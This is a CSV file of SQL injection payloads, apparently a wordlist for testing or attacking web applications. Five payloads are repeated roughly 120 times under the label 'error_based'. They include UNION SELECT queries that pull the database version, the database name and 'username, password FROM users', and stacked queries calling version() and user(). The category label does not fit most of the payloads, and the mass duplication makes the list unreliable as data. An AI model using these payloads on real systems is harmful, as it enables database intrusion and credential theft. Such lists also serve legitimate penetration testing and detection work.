Category,Payload
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
error_based,' OR 1=1; SELECT version(); --
error_based,' OR 1=1; SELECT user(); --
error_based,"' UNION SELECT NULL, NULL, @@version --"
error_based,"' UNION SELECT NULL, database() --"
error_based,"' UNION SELECT username, password FROM users --"
